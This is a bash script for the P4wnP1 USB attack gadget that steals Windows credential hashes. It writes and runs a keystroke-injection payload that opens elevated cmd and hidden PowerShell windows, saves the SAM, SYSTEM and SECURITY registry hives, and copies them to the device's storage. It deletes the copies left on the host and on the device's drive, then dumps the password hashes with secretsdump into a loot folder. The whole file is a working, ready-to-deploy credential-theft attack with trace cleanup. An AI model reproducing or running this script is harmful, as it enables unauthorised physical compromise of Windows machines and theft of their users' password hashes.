#!/bin/bash

# Steal windows sam, system and security to retrive hashes
# Based on: https://github.com/PingDucKY/payloads-P4wnP1-A.L.O.A/tree/master/steal-windows-hash
# You need to have impacket installed
# sudo apt-get install python-impacket or download and install from https://github.com/SecureAuthCorp/impacket
# secretsdump.py from the impacket examples folder should be located in: "/usr/local/bin/secretsdump.py" (should already be there in kali linux)
# Create disk using genimg: /usr/local/P4wnP1/helper/genimg -i -s 50 -o 50mb -l sam
# You need to setup P4wnP1 USB Gadget Settings as Keyboard and Mass Storage and mount the disk you created
# Copy this script to "/usr/local/P4wnP1/scripts/"
# Create a trigger to start this bash script when USB gadget connected to host

echo "[*] Checking for mass storage..."
if [ ! -f /usr/local/P4wnP1/ums/flashdrive/50mb.bin ]; then
    echo "[!] Mass storage not found, Please create one using genimg"
    exit 1
  fi

echo "[*] Checking if secretsdump.py is installed..."
if [ ! -f /usr/local/bin/secretsdump.py ]; then
    echo "[!] secretsdump.py not found!"
    exit 1
  fi


LOOTDIR=/usr/local/P4wnP1/www/loot/sam/$(date +%Y%m%d%H%M%S)
rm -rf /tmp/samdata
echo "[*] Creating temp directory..."
mkdir -p /tmp/samdata
echo "[*] Creating loot directory..."
mkdir -p $LOOTDIR
echo "[*] Generating HID Attack"
sleep 2
echo "layout(\"us\")" > /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "press(\"GUI r\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(200)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"cmd\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "press(\"CTRL SHIFT ENTER\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(750)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "press(\"LEFT\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(200)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "press(\"ENTER\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(750)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"echo y | reg.exe save hklm\\\\sam C:\\\\Windows\\\\Temp\\\\sam.save\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(750)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"echo y | reg.exe save hklm\\\\system C:\\\\Windows\\\\Temp\\\\system.save\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(750)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"echo y | reg.exe save hklm\\\\security C:\\\\Windows\\\\Temp\\\\security.save\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(750)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"exit\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(200)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "press(\"GUI r\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(200)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"powershell.exe\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "press(\"CTRL SHIFT ENTER\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(750)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "press(\"LEFT\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "press(\"ENTER\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(1000)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"PowerShell.exe -windowstyle hidden { \\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(400)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"\$usbPath = Get-WMIObject Win32_Volume | ? { \$_.Label -eq 'sam' } | select name\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(400)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"cp C:\\\\windows\\\\\\\temp\\\\sam.save \$usbPath.name\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(400)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"cp C:\\\\windows\\\\\\\temp\\\\security.save \$usbPath.name\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(400)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"cp C:\\\\windows\\\\\\\temp\\\\system.save \$usbPath.name\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(200)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"}\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(1000)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"del C:\\\\windows\\\\\\\temp\\\\sam.save\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(400)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"del C:\\\\windows\\\\\\\temp\\\\security.save\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(400)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"del C:\\\\windows\\\\\\\temp\\\\system.save\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "delay(200)" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "type(\"exit\\n\")" >> /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
sleep 2
echo "[*] Executing HID Attack..."
P4wnP1_cli hid run -n extract-sam-system-security.js >/dev/null
sleep 5
echo "[*] Extracting data from mass storage..."
7z x /usr/local/P4wnP1/ums/flashdrive/50mb.bin -o/tmp/samdata/ >/dev/null
sleep 5
echo "[*] Deleting files from mass storage..."
P4wnP1_cli hid run -c 'layout("us"); press("GUI r"); delay(500); type("powershell\n"); delay(1000); type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \"sam\" } | select name;$drive = $usbPath.name;Remove-Item $drive\\*.*\n");type("exit\n")' >/dev/null
echo "[*] Dumping hashes..."
secretsdump.py -sam /tmp/samdata/sam.save -security /tmp/samdata/security.save -system /tmp/samdata/system.save LOCAL > /tmp/samdata/outputsecretdump.txt
sleep 5
echo "[*] Copying files to loot directory..."
cp /tmp/samdata/outputsecretdump.txt $LOOTDIR
echo "[*] Removing temp files..."
rm -rf /tmp/samdata
rm /usr/local/P4wnP1/HIDScripts/extract-sam-system-security.js
echo "[+] Done!"
P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
